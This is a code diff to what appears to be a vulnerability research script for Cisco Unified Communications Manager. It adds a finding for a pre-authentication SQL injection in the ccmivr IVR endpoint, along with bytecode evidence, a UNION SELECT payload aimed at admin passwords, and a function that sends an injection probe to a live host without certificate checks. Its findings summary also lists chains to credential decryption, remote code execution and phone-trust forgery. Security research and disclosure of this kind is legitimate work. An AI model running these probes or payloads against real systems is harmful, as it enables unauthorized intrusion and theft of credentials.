@@ -447,15 +447,38 @@ CUCM-F36 LOW: Decrypted credential logging in CCM trace logs
   Impact: lateral movement via SAF inter-cluster passwords; SIP device password recovery → rogue registration
   CVSS: 3.5 Low AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
 
+CUCM-F37 HIGH: Pre-Auth SQL Injection in ccmivr IVR via ccmusername PreparedStatement bypass
+  Component: cm-ccmivr/usr/local/cm/war/ccmivr.war
+             IVRDBInterface.getRemoteDestinationListFromCcmusername()
+  Root cause: SQL built via StringBuilder.append(ccmusername) BEFORE prepareStatement() call.
+              No ? placeholders; no setString() calls. PreparedStatement provides zero protection.
+  Validator: CcmivrValidator.IsUserNameValid() regex ^[a-zA-Z0-9$_@.&!*\"\'(),%-]+$ — allows single quote '
+  Auth: web.xml security-constraint uses <http-method-omission> for GET and POST →
+        GET and POST endpoints are UNRESTRICTED (no HTTP auth required)
+  Bytecode evidence (IVRDBInterface.class, getRemoteDestinationListFromCcmusername):
+    55: ldc #104  "select ... where e.userid = '"
+    61: invokevirtual #14  StringBuilder.append(ccmusername)  ← user input
+    64: ldc #105  "' and rdd.fkremotedestination = ..."
+    155: invokevirtual #51  Connector.prepareStatement(String, int, int)  ← concatenated SQL, no placeholders
+    162: invokeinterface #52  PreparedStatement.executeQuery()
+  Attack: ccmusername=x' UNION SELECT password FROM enduser WHERE userid='admin
+  Amplifier: F3 static key decrypts any returned encrypted passwords from enduser table
+  CVSS: 8.6 High AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+
 === PENDING TASKS ===
 - ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
 - Nimbus JOSE+JWT CVE mapping for 4.23 build
-- cm-ccintegration: Contact Center integration (not yet analyzed)
+- cm-security: security subsystem key/cert management
+- cm-sso: SSO implementation (additional findings beyond F33)
+- cm-idp: Identity Provider
+- cm-ccmuser: CCMUser WAR (only context.xml analyzed so far)
+- cm-tftp: TFTP device provisioning / phone firmware
+- cm-pnp: Plug and Play provisioning
 - cm-car / cm-cdrdlv: CDR/CAR reporting (low priority)
 - cm-ccm binary deep dive: SIP nonce generation, RADIUS auth, media crypto key exchange
 """
 
-VERSION = "2.7.0"
+VERSION = "2.8.0"
 
 import requests
 import urllib3
@@ -1095,6 +1118,68 @@ def check_credential_logging(log_dir: str = None) -> dict:
     return evidence
 
 
+def check_ccmivr_sqli(host: str = None, port: int = 8443) -> dict:
+    """CUCM-F37: Probe ccmivr IVR endpoint for pre-auth SQL injection via ccmusername.
+    Root cause: StringBuilder.append(ccmusername) before prepareStatement() — no parameterization.
+    Validator allows single-quote in username; GET/POST unprotected by web.xml constraint."""
+    evidence = {
+        "finding": "CUCM-F37",
+        "severity": "HIGH",
+        "cvss": "8.6 High AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+        "war": "/usr/local/cm/war/ccmivr.war",
+        "vulnerable_class": "com.cisco.snr.ivr.util.IVRDBInterface",
+        "vulnerable_method": "getRemoteDestinationListFromCcmusername",
+        "sqli_param": "ccmusername",
+        "validator_regex": "^[a-zA-Z0-9$_@.&!*\"'(),%-]+$",
+        "validator_flaw": "allows single-quote character — SQL string escape breakout",
+        "auth_bypass": "web.xml <http-method-omission>GET/POST — GET and POST requests unrestricted",
+        "sql_template": "select rdd.destination from enduser e, ... where e.userid = '<PARAM>' and ...",
+        "test_payload": "x' UNION SELECT password FROM enduser WHERE userid='admin",
+        "amplifier": "F3 static key decrypts any returned enduser.password values",
+        "bytecode_evidence": {
+            "offset_55": "ldc #104 — SQL prefix with userid = '",
+            "offset_61": "invokevirtual StringBuilder.append(ccmusername) — user input concatenated",
+            "offset_155": "invokevirtual Connector.prepareStatement(String, int, int) — no ? placeholders",
+            "offset_162": "invokeinterface PreparedStatement.executeQuery() — no setString() calls",
+        },
+    }
+    if host:
+        url = f"https://{host}:{port}/ccmivr/ccmivr.do"
+        params_benign = {
+            "action": "IVRCalleridLookup2",
+            "ccmusername": "testuser",
+            "pin": "0000",
+            "srcdir": "en_US",
+            "remotedest": "5551234567",
+            "accessCount": "0",
+        }
+        params_sqli = {
+            "action": "IVRCalleridLookup2",
+            "ccmusername": "x' OR '1'='1",
+            "pin": "0000",
+            "srcdir": "en_US",
+            "remotedest": "5551234567",
+            "accessCount": "0",
+        }
+        try:
+            r_benign = requests.get(url, params=params_benign, verify=False, timeout=10)
+            r_sqli = requests.get(url, params=params_sqli, verify=False, timeout=10)
+            evidence["probe"] = {
+                "benign_status": r_benign.status_code,
+                "sqli_status": r_sqli.status_code,
+                "benign_len": len(r_benign.text),
+                "sqli_len": len(r_sqli.text),
+                "response_diff": abs(len(r_sqli.text) - len(r_benign.text)),
+                "accessible_unauth": r_benign.status_code in (200, 302, 500),
+                "error_difference": r_sqli.text != r_benign.text,
+            }
+            if r_sqli.status_code == 500 and r_benign.status_code != 500:
+                evidence["probe"]["sql_error_triggered"] = True
+        except Exception as e:
+            evidence["probe"] = {"error": str(e)}
+    return evidence
+
+
 def full_findings_summary() -> str:
     """Return a printable summary of all CUCM RE findings."""
     findings = [
@@ -1134,6 +1219,7 @@ def full_findings_summary() -> str:
         ("CUCM-F34", "HIGH",     "F3 static key decrypts full credential estate: ldapauthentication.ldappassword (AD bind), device.sshpassword (all phones), directorypluginconfig.ldappassword (DirSync), UDS LDAP + service profile passwords; confirmed in 5 binaries"),
         ("CUCM-F35", "CRITICAL", "F1 RCE + F30 plaintext passphrase → CTLCli CTL file forge → phone estate trusts attacker cert → MitM all SRTP/TLS"),
         ("CUCM-F36", "LOW",      "Decrypted credential logging: SIPSecurity, SAF connection profile, HttpNPConnection all log plaintext passwords at trace level"),
+        ("CUCM-F37", "HIGH",     "Pre-auth SQLi in ccmivr ccmusername via prepareStatement-with-concatenated-string (no ? placeholders); validator allows single-quote; GET/POST unprotected; amplified by F3 to decrypt returned enduser passwords"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
